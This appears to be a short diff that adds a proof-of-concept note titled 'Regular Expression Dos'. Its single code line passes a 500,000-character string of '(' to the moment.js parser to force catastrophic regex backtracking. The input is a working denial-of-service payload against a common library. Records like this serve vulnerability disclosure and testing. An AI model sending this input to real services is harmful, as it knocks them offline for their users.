@@ -1,0 +1,3 @@
+Regular Expression Dos:
+
+moment("(".repeat(500000))
